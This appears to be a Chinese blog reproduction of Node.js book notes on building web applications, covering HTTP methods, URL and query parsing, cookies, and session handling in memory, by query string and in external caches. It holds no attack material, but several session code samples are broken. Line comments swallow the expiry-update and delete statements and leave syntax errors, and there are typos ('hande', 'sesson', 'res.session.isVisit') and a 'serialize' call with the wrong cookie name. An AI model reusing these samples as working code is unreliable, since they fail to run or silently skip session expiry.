<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> https = <span class="built_in">require</span>(<span class="string">'https'</span>);</div><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> options = &#123;</div><div class="line">  <span class="attr">hostname</span>: <span class="string">'localhost'</span>,</div><div class="line">  <span class="attr">port</span>: <span class="number">8000</span>,</div><div class="line">  <span class="attr">path</span>: <span class="string">'/'</span>,</div><div class="line">  <span class="attr">method</span>: <span class="string">'GET'</span>,</div><div class="line">  <span class="attr">key</span>: fs.readFileSync(<span class="string">'./keys/client.key'</span>),</div><div class="line">  <span class="attr">cert</span>: fs.readFileSync(<span class="string">'./keys/client.crt'</span>),</div><div class="line">  <span class="attr">ca</span>: [fs.readFileSync(<span class="string">'./keys/ca.crt'</span>)]</div><div class="line">&#125;;</div><div class="line"></div><div class="line">options.agent = <span class="keyword">new</span> https.Agent(options);</div><div class="line"><span class="keyword">var</span> req = https.request(options, <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</div><div class="line">  res.setEncoding(<span class="string">'utf-8'</span>);</div><div class="line">  res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">d</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(d);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">req.end();</div><div class="line"></div><div class="line">req.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(e);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h3 id="7-6-总结-1"><a href="#7-6-总结-1" class="headerlink" title="7.6 总结"></a>7.6 总结</h3><p>Node基于事件驱动和非阻塞设计，在分布式环境中尤其能发挥出它的特长，基于事件驱动可以实现与大量的客户端进行连接，非阻塞设计则让它可以更好地提升网络的响应吞吐。Node提供了相对底层的网络调用，以及基于事件的编程接口，使得开发者在这些模块上十分轻松地构建网络应用。下一章我们将在本章的基础上探讨具体的Web应用。</p>
<h2 id="第08章-构建Web应用-1"><a href="#第08章-构建Web应用-1" class="headerlink" title="第08章 构建Web应用"></a>第08章 构建Web应用</h2><p>如今看来，Web应用俨然是互联网的主角，伴随Web 1.0、Web 2.0一路走来，HTTP占据了网络中的大多数流量。随着移动互联网时代的到来，Web又开始在移动浏览器上发挥光和热。在Web标准化的努力过后，Web又开始朝向应用化发展，JavaScript在前端变得炙手可热</p>
<h3 id="8-1-基础功能-1"><a href="#8-1-基础功能-1" class="headerlink" title="8.1 基础功能"></a>8.1 基础功能</h3><p>非阻塞</p>
<p>事件机制</p>
<p>对于一个Web应用而言，仅仅只是上面这样的响应远远达不到业务的需求。在具体的业务中，我们可能有如下这些需求。</p>
<ul>
<li>请求方法的判断。URL的路径解析。</li>
<li>URL中查询字符串解析。Cookie的解析。</li>
<li>Basic认证。表单数据的解析。</li>
<li>任意格式文件的上传处理。</li>
</ul>
<p>除此之外，可能还有<code>Session（会话）</code> 的需求。尽管Node提供的底层API相对来说比较简单，但要完成业务需求，还需要大量的工作，仅仅一个request事件似乎无法满足这些需求。但是要实现这些需求并非难事，一切的一切，都从如下这个函数展开：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  res.writeHead(<span class="number">200</span>, &#123;</div><div class="line">    <span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span></div><div class="line">  &#125;);</div><div class="line">  res.end();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在第4章中，我们曾对高阶函数有过简单的介绍：我们的应用可能无限地复杂，但是只要最终结果返回一个上面的函数作为参数，传递给createServer()方法作为request事件的侦听器就可以了。</p>
<h3 id="8-1-1-请求方法-1"><a href="#8-1-1-请求方法-1" class="headerlink" title="8.1.1 请求方法"></a>8.1.1 请求方法</h3><p>在Web应用中，最常见的请求方法是GET和POST，除此之外，还有HEAD、DELETE、PUT、CONNECT等方法。请求方法存在于报文的第一行的第一个单词，通常是大写</p>
<p>如下为一个报文头的示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">GET /path?foo=bar HTTP/1.1 </div><div class="line">User-Agent: curl/7.24.0(x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5</div><div class="line">Host: 127.0.0.1:1337 </div><div class="line">Accept: */*</div></pre></td></tr></table></figure>
<p><code>HTTP_Parser</code>在解析请求报文的时候，将报文头抽取出来，设置为req.method。通常，我们只需要处理GET和POST两类请求方法，但是在RESTful类Web服务中请求方法十分重要，因为它会决定资源的操作行为。PUT代表新建一个资源，POST表示要更新一个资源，GET表示查看一个资源，而DELETE表示删除一个资源。</p>
<p>我们可以通过请求方法来决定响应行为，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">switch</span> (req.method) &#123;</div><div class="line">    <span class="keyword">case</span> <span class="string">'POST'</span>:</div><div class="line">      update(req, res);</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">'DELETE'</span>:</div><div class="line">      remove(req, res);</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">'PUT'</span>:</div><div class="line">      create(req, res);</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">'GET'</span>:</div><div class="line">    <span class="keyword">default</span>:</div><div class="line">      get(req, res);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="8-1-2-路径解析-1"><a href="#8-1-2-路径解析-1" class="headerlink" title="8.1.2 路径解析"></a>8.1.2 路径解析</h3><p>路径解析</p>
<p>除了根据请求方法来进行分发外，最常见的请求判断莫过于路径的判断了。路径部分存在于报文的第一行的第二部分，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">GET /path?foo=bar HTTP/1.1</div></pre></td></tr></table></figure>
<p><code>HTTP_Parser</code>将其解析为req.url。一般而言，完整的URL地址是如下这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://user:pass@host.com:8080/p/a/t/h?query=string#hash</div></pre></td></tr></table></figure>
<p>客户端代理（浏览器）会将这个地址解析成报文，将路径和查询部分放在报文第一行。需要注意的是，hash部分会被丢弃，不会存在于报文的任何地方。</p>
<h3 id="8-1-3-查询字符串-1"><a href="#8-1-3-查询字符串-1" class="headerlink" title="8.1.3 查询字符串"></a>8.1.3 查询字符串</h3><p>查询字符串</p>
<p>查询字符串位于路径之后，在地址栏中路径后的?foo=bar&amp;baz=val字符串就是查询字符串。这个字符串会跟随在路径后，形成请求报文首行的第二部分。这部分内容经常需要为业务逻辑所用，Node提供了querystring模块用于处理这部分数据，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</div><div class="line"><span class="keyword">var</span> query = querystring.parse(url.parse(req.url).query);</div></pre></td></tr></table></figure>
<p>更简洁的方法是给url.parse()传递第二个参数，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> query = url.parse(req.url, <span class="literal">true</span>).query;</div></pre></td></tr></table></figure>
<p>它会将foo=bar&amp;baz=val解析为一个JSON对象，如下所示：</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">&#123;</div><div class="line">  foo: 'bar',</div><div class="line">  baz: 'val'</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="8-1-4-Cookie-1"><a href="#8-1-4-Cookie-1" class="headerlink" title="8.1.4 Cookie"></a>8.1.4 Cookie</h2><h3 id="初识Cookie-1"><a href="#初识Cookie-1" class="headerlink" title="初识Cookie"></a>初识Cookie</h3><p>在Web应用中，请求路径和查询字符串对业务至关重要，通过它们已经可以进行很多业务操作了，但是HTTP是一个无状态的协议，现实中的业务却是需要一定的状态的，否则无法区分用户之间的身份。如何标识和认证一个用户，最早的方案就是Cookie（曲奇饼）了</p>
<p>Cookie的处理分为如下几步。</p>
<ul>
<li>服务器向客户端发送Cookie。浏览器将Cookie保存。<br>之后每次浏览器都会将Cookie发向服务器端。客户端发送的Cookie在请求报文的Cookie字段中，我们可以通过curl工具构造这个字段，如下所示：<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">curl -v -H &quot;Cookie: foo=bar; baz=val&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>“<a href="http://127.0.0.1:1337/path?foo=bar&amp;foo=baz" target="_blank" rel="external">http://127.0.0.1:1337/path?foo=bar&amp;foo=baz</a>“</p>
<p>HTTP_Parser会将所有的报文字段解析到req.headers上，那么Cookie就是req.headers.cookie。根据规范中的定义，Cookie值的格式是key=value; key2=value2形式的，如果我们需要Cookie，解析它也十分容易，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> parseCookie = <span class="function"><span class="keyword">function</span> (<span class="params">cookie</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> cookies = &#123;&#125;;</div><div class="line">  <span class="keyword">if</span> (!cookie) &#123;</div><div class="line">    <span class="keyword">return</span> cookies;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">var</span> list = cookie.split(<span class="string">';'</span>);</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</div><div class="line">    <span class="keyword">var</span> pair = list[i].split(<span class="string">'='</span>);</div><div class="line">    cookies[pair[<span class="number">0</span>].trim()] = pair[<span class="number">1</span>];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> cookies;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>在业务逻辑代码执行之前，我们将其挂载在req对象上，让业务代码可以直接访问，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  req.cookies = parseCookie(req.headers.cookie);</div><div class="line">  hande(req, res);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>任何请求报文中，如果Cookie值没有isVisit，都会收到“欢迎第一次来到动物园”这样的响应。这里提出一个问题，如果识别到用户没有访问过我们的站点，那么我们的站点是否应该告诉客户端已经访问过的标识呢？告知客户端的方式是通过响应报文实现的，响应的Cookie值在Set-Cookie字段中。它的格式与请求中的格式不太相同，规范中对它的定义如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Set-Cookie: name=value; </div><div class="line">Path=/; </div><div class="line">Expires=Sun, 23-Apr-23 09:01:35 GMT;</div><div class="line">Domain=.domain.com;</div></pre></td></tr></table></figure>
<p>其中name=value是必须包含的部分，其余部分皆是可选参数。这些可选参数将会影响浏览器在后续将Cookie发送给服务器端的行为</p>
<p>path表示这个Cookie影响到的路径，当前访问的路径不满足该匹配时，浏览器则不发送这个Cookie。<br>Expires和Max-Age是用来告知浏览器这个Cookie何时过期的，如果不设置该选项，在关闭浏览器时会丢失掉这个Cookie。如果设置了过期时间，浏览器将会把Cookie内容写入到磁盘中并保存，下次打开浏览器依旧有效。Expires的值是一个UTC格式的时间字符串，告知浏览器此Cookie何时将过期，Max-Age则告知浏览器此Cookie多久后过期。前者一般而言不存在问题，但是如果服务器端的时间和客户端的时间不能匹配，这种时间设置就会存在偏差。为此，Max-Age告知浏览器这条Cookie多久之后过期，而不是一个具体的时间点。</p>
<p>HttpOnly告知浏览器不允许通过脚本document.cookie去更改这个Cookie值，事实上，设置HttpOnly之后，这个值在document.cookie中不可见。但是在HTTP请求的过程中，依然会发送这个Cookie到服务器端。</p>
<p>Secure。当Secure值为true时，在HTTP中是无效的，在HTTPS中才有效，表示创建的Cookie只能在HTTPS连接中被浏览器传递到服务器端进行会话验证，如果是HTTP连接则不会传递该信息，所以很难被窃听到。</p>
<p>略改前文的访问逻辑，我们就能轻松地判断用户的状态了，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (!req.cookies.isVisit) &#123;</div><div class="line">    res.setHeader(<span class="string">'Set-Cookie'</span>, serialize(<span class="string">'isVisit'</span>, <span class="string">'1'</span>));</div><div class="line">    res.writeHead(<span class="number">200</span>);</div><div class="line">    res.end(<span class="string">'欢迎第一次来到动物园'</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    res.writeHead(<span class="number">200</span>);</div><div class="line">    res.end(<span class="string">'动物园再次欢迎你'</span>);</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>值得注意的是，Set-Cookie是较少的，在报头中可能存在多个字段。为此res.setHeader的第二个参数可以是一个数组，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">res.setHeader(<span class="string">'Set-Cookie'</span>, [serialize(<span class="string">'foo'</span>, <span class="string">'bar'</span>), serialize(<span class="string">'baz'</span>, <span class="string">'val'</span>)]);</div></pre></td></tr></table></figure>
<p>这会在报文头部中形成两条Set-Cookie字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Set-Cookie: foo=bar</div><div class="line">Path=/</div><div class="line">Expires=Sun, 23-Apr-23 09:01:35 GMT</div><div class="line">Domain=.domain.com</div><div class="line">Set-Cookie: baz=val</div><div class="line">Path=/</div><div class="line">Expires=Sun, 23-Apr-23 09:01:35 GMT</div><div class="line">Domain=.domain.com</div></pre></td></tr></table></figure>
<h3 id="Cookie的性能影响-1"><a href="#Cookie的性能影响-1" class="headerlink" title="Cookie的性能影响"></a>Cookie的性能影响</h3><p>由于Cookie的实现机制，一旦服务器端向客户端发送了设置Cookie的意图，除非Cookie过期，否则客户端每次请求都会发送这些Cookie到服务器端，一旦设置的Cookie过多，将会导致报头较大。大多数的Cookie并不需要每次都用上，因为这会造成带宽的部分浪费。</p>
<p><strong>在YSlow的性能优化规则中有这么一条：减小Cookie的大小</strong></p>
<p>更严重的情况是，如果在域名的根节点设置Cookie，几乎所有子路径下的请求都会带上这些Cookie，这些Cookie在某些情况下是有用的，但是在有些情况下是完全无用的。其中以静态文件最为典型，静态文件的业务定位几乎不关心状态，Cookie对它而言几乎是无用的，但是一旦有Cookie设置到相同域下，它的请求中就会带上Cookie。</p>
<p>好在Cookie在设计时限定了它的域，只有域名相同时才会发送。</p>
<p><strong>所以YSlow中有另外一条规则用来避免Cookie带来的性能影响。为静态组件使用不同的域名</strong></p>
<p>简而言之就是，为不需要Cookie的组件换个域名可以实现减少无效Cookie的传输。所以很多网站的静态文件会有特别的域名，使得业务相关的Cookie不再影响静态资源。当然换用额外的域名带来的好处不只这点，还可以突破浏览器下载线程数量的限制，因为域名不同，可以将下载线程数翻倍。但是换用额外域名还是有一定的缺点的，那就是将域名转换为IP需要进行DNS查询，多一个域名就多一次DNS查询。</p>
<p><strong>YSlow中有这样一条规则：减少DNS查询</strong></p>
<p>看起来减少DNS查询和使用不同的域名是冲突的两条规则，但是好在现今的浏览器都会进行DNS缓存，以削弱这个副作用的影响。</p>
<p>Cookie除了可以通过后端添加协议头的字段设置外，在前端浏览器中也可以通过JavaScript进行修改，浏览器将Cookie通过document.cookie暴露给了JavaScript。前端在修改Cookie之后，后续的网络请求中就会携带上修改过后的值</p>
<p>目前，广告和在线统计领域是最为依赖Cookie的，通过嵌入第三方的广告或者统计脚本，将Cookie和当前页面绑定，这样就可以标识用户，得到用户的浏览行为，广告商就可以定向投放广告了。尽管这样的行为看起来很可怕，但是从Cookie的原理来说，它只能做到标识，而不能做任何具有破坏性的事情。如果依然担心自己站点的用户被记录下行为，那就不要挂任何第三方的脚本</p>
<h3 id="8-1-5-Session-1"><a href="#8-1-5-Session-1" class="headerlink" title="8.1.5 Session"></a>8.1.5 Session</h3><p>通过Cookie，浏览器和服务器可以实现状态的记录。但是Cookie并非是完美的，前文提及的体积过大就是一个显著的问题，最为严重的问题是Cookie可以在前后端进行修改，因此数据就极容易被篹改和伪造。如果服务器端有部分逻辑是根据Cookie中的isVIP字段进行判断，那么一个普通用户通过修改Cookie就可以轻松享受到VIP服务了。综上所述，Cookie对于敏感数据的保护是无效的</p>
<p>为了解决Cookie敏感数据的问题，Session应运而生。Session的数据只保留在服务器端，客户端无法修改，这样数据的安全性得到一定的保障，数据也无须在协议中每次都被传递。</p>
<p>虽然在服务器端存储数据十分方便，但是如何将每个客户和服务器中的数据一一对应起来，这里有常见的两种实现方式。</p>
<ul>
<li>第一种：基于Cookie来实现用户和数据的映射</li>
</ul>
<p>虽然将所有数据都放在Cookie中不可取，但是将口令放在Cookie中还是可以的。因为口令一旦被篹改，就丢失了映射关系，也无法修改服务器端存在的数据了。并且Session的有效期通常较短，普遍的设置是20分钟，如果在20分钟内客户端和服务器端没有交互产生，服务器端就将数据删除。由于数据过期时间较短，且在服务器端存储数据，因此安全性相对较高。那么口令是如何产生的呢？一旦服务器端启用了Session，它将约定一个键值作为Session的口令，这个值可以随意约定，比如Connect默认采用connect_uid，Tomcat会采用jsessionid等。一旦服务器检查到用户请求Cookie中没有携带该值，它就会为之生成一个值，这个值是唯一且不重复的值，并设定超时时间。</p>
<p>以下为生成session的代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> sessions = &#123;&#125;;</div><div class="line"><span class="keyword">var</span> key = <span class="string">'session_id'</span>;</div><div class="line"><span class="keyword">var</span> EXPIRES = <span class="number">20</span> * <span class="number">60</span> * <span class="number">1000</span>;</div><div class="line"><span class="keyword">var</span> generate = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> session = &#123;&#125;;</div><div class="line">  session.id = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + <span class="built_in">Math</span>.random();</div><div class="line">  session.cookie = &#123;</div><div class="line">    <span class="attr">expire</span>: (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + EXPIRES</div><div class="line">  &#125;;</div><div class="line">  sessions[session.id] = session;</div><div class="line">  <span class="keyword">return</span> session;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>每个请求到来时，检查Cookie中的口令与服务器端的数据，如果过期，就重新生成，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> id = req.cookies[key];</div><div class="line">  <span class="keyword">if</span> (!id) &#123;</div><div class="line">    req.session = generate();</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">var</span> session = sessions[id];</div><div class="line">    <span class="keyword">if</span> (session) &#123;</div><div class="line">      <span class="keyword">if</span> (session.cookie.expire &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime()) &#123;</div><div class="line">        <span class="comment">// 更新超时时间 session.cookie.expire = (new</span></div><div class="line">        <span class="built_in">Date</span>()).getTime() + EXPIRES;</div><div class="line">      req.session = session;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="comment">// 超时了，删除旧的数据，并重新生成 delete sessions[id];</span></div><div class="line">      req.session = generate();</div><div class="line">    &#125;</div><div class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果session过期或口令不对，重新生成session</span></div><div class="line">    req.session = generate();</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">handle(req, res);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当然仅仅重新生成Session还不足以完成整个流程，还需要在响应给客户端时设置新的值，以便下次请求时能够对应服务器端的数据。这里我们hack响应对象的writeHead()方法，在它的内部注入设置Cookie的逻辑，</p>
<p>如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> writeHead = res.writeHead;</div><div class="line">res.writeHead = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> cookies = res.getHeader(<span class="string">'Set-Cookie'</span>);</div><div class="line">  <span class="keyword">var</span> session =</div><div class="line">    serialize(<span class="string">'Set-Cookie'</span>, req.session.id);</div><div class="line">  cookies = <span class="built_in">Array</span>.isArray(cookies) ? cookies.concat(session) : [cookies,</div><div class="line">    session</div><div class="line">  ];</div><div class="line">  res.setHeader(<span class="string">'Set-Cookie'</span>, cookies);</div><div class="line">  <span class="keyword">return</span> writeHead.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>session在前后端进行对应的过程就完成了。这样的业务逻辑可以判断和设置session，以此来维护用户与服务器端的关系</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (!req.session.isVisit) &#123;</div><div class="line">    res.session.isVisit = <span class="literal">true</span>;</div><div class="line">    res.writeHead(<span class="number">200</span>);</div><div class="line">    res.end(<span class="string">'欢迎第一次来到动物园'</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    res.writeHead(<span class="number">200</span>);</div><div class="line">    res.end(<span class="string">'动物园再次欢迎你'</span>);</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这样在session中保存的数据比直接在Cookie中保存数据要安全得多。这种实现方案依赖Cookie实现，而且也是目前大多数Web应用的方案。如果客户端禁止使用Cookie，这个世界上大多数的网站将无法实现登录等操作。</p>
<p>第二种：通过查询字符串来实现浏览器端和服务器端数据的对应</p>
<p>它的原理是检查请求的查询字符串，如果没有值，会先生成新的带值的URL，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> getURL = <span class="function"><span class="keyword">function</span> (<span class="params">_url, key, value</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> obj = url.parse(_url, <span class="literal">true</span>);</div><div class="line">  obj.query[key] = value;</div><div class="line">  <span class="keyword">return</span> url.format(obj);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>然后形成跳转，让客户端重新发起请求，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> redirect = <span class="function"><span class="keyword">function</span> (<span class="params">url</span>) </span>&#123;</div><div class="line">    res.setHeader(<span class="string">'Location'</span>, url);</div><div class="line">    res.writeHead(<span class="number">302</span>);</div><div class="line">    res.end();</div><div class="line">  &#125;;</div><div class="line">  <span class="keyword">var</span> id = req.query[key];</div><div class="line">  <span class="keyword">if</span> (!id) &#123;</div><div class="line">    <span class="keyword">var</span> session = generate();</div><div class="line">    redirect(getURL(req.url, key, session.id));</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">var</span> session = sessions[id];</div><div class="line">    <span class="keyword">if</span> (session) &#123;</div><div class="line">      <span class="keyword">if</span> (session.cookie.expire &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime()) &#123; <span class="comment">// 更新超时时间</span></div><div class="line">        session.cookie.expire = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + EXPIRES;</div><div class="line">        req.session =</div><div class="line">          session;</div><div class="line">        handle(req, res);</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">// 超时了，删除旧的数据，并重新生成 delete sessions[id];</span></div><div class="line">        <span class="keyword">var</span> session = generate();</div><div class="line">        redirect(getURL(req.url, key, session.id));</div><div class="line">      &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="comment">// 如果session过期或口令不对，重新生成session</span></div><div class="line">      <span class="keyword">var</span> session = generate();</div><div class="line">      redirect(getURL(req.url, key, session.id));</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>用户访问<a href="http://localhost/pathname时，如果服务器端发现查询字符串中不带`session_id`" target="_blank" rel="external">http://localhost/pathname时，如果服务器端发现查询字符串中不带`session_id`</a> 参数，就会将用户跳转到<code>http://localhost/pathname?session_id=12344567</code>这样一个类似的地址。如果浏览器收到302状态码和Location报头，就会重新发起新的请求，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt; HTTP/1.1 302 Moved Temporarily </div><div class="line">&lt; Location: /pathname?session_id=12344567</div></pre></td></tr></table></figure>
<p>这样，新的请求到来时就能通过Session的检查，除非内存中的数据过期。</p>
<p>有的服务器在客户端禁用Cookie时，会采用这种方案实现退化。通过这种方案，无须在响应时设置Cookie。但是这种方案带来的风险远大于基于Cookie实现的风险，因为只要将地址栏中的地址发给另外一个人，那么他就拥有跟你相同的身份。Cookie的方案在换了浏览器或者换了电脑之后无法生效，相对较为安全。</p>
<p>还有一种比较有趣的处理Session的方式是利用HTTP请求头中的ETag，同样对于更换浏览器和电脑后也是无效的</p>
<h3 id="Session与内存-1"><a href="#Session与内存-1" class="headerlink" title="Session与内存"></a>Session与内存</h3><p>在上面的示例代码中，我们都将Session数据直接存在变量sessions中，它位于内存中。然而在第5章的内存控制部分，我们分析了为什么Node会存在内存限制，这里将数据存放在内存中将会带来极大的隐患，如果用户增多，我们很可能就接触到了内存限制的上限，并且内存中的数据量加大，必然会引起垃圾回收的频繁扫描，引起性能问题。另一个问题则是我们可能为了利用多核CPU而启动多个进程，这个细节在第9章中有详细描述。用户请求的连接将可能随意分配到各个进程中，Node的进程与进程之间是不能直接共享内存的，用户的Session可能会引起错乱。<br>为了解决性能问题和Session数据无法跨进程共享的问题，常用的方案是将Session集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中。目前常用的工具是Redis、Memcached等，通过这些高效的缓存，Node进程无须在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些高速缓存设计的缓存过期策略更合理更高效，比在Node中自行设计缓存策略更好。</p>
<p>采用第三方缓存来存储Session引起的一个问题是会引起网络访问。理论上来说访问网络中的数据要比访问本地磁盘中的数据速度要慢，因为涉及到握手、传输以及网络终端自身的磁盘I/O等，尽管如此但依然会采用这些高速缓存的理由有以下几条：</p>
<ul>
<li>Node与缓存服务保持长连接，而非频繁的短连接，握手导致的延迟只影响初始化。</li>
<li>高速缓存直接在内存中进行数据存储和访问。</li>
<li>缓存服务通常与Node进程运行在相同的机器上或者相同的机房里，网络速度受到的影响较小。</li>
</ul>
<p>尽管采用专门的缓存服务会比直接在内存中访问慢，但其影响小之又小，带来的好处却远远大于直接在Node中保存数据。为此，一旦Session需要异步的方式获取，代码就需要略作调整，变成异步的方式，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> id = req.cookies[key];</div><div class="line">  <span class="keyword">if</span> (!id) &#123;</div><div class="line">    req.session = generate();</div><div class="line">    handle(req, res);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    store.get(id, <span class="function"><span class="keyword">function</span> (<span class="params">err, sesson</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (session) &#123;</div><div class="line">          <span class="keyword">if</span> (session.cookie.expire &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime()) &#123;</div><div class="line">            <span class="comment">// 更新超时时间 session.cookie.expire = (new</span></div><div class="line">            <span class="built_in">Date</span>()).getTime() + EXPIRES;</div><div class="line">          req.session = session;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          <span class="comment">// 超时了，删除旧的数据，并重新生成 delete sessions[id];</span></div><div class="line">          req.session = generate();</div><div class="line">        &#125;</div><div class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果session过期或口令不对，重新生成session</span></div><div class="line">        req.session = generate();</div><div class="line">      &#125;</div><div class="line">      handle(req, res);</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在响应时，将新的session保存回缓存中，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> writeHead = res.writeHead;</div><div class="line">res.writeHead = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> cookies = res.getHeader(<span class="string">'Set-Cookie'</span>);</div><div class="line">  <span class="keyword">var</span> session = serialize(<span class="string">'Set-Cookie'</span>, req.session.id);</div><div class="line">  cookies =</div><div class="line">    <span class="built_in">Array</span>.isArray(cookies) ? cookies.concat(session) : [cookies, session];</div><div class="line">  res.setHeader(<span class="string">'Set-Cookie'</span>, cookies); <span class="comment">// 保存回缓存</span></div><div class="line">  store.save(req.session);</div><div class="line">  <span class="keyword">return</span> writeHead.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
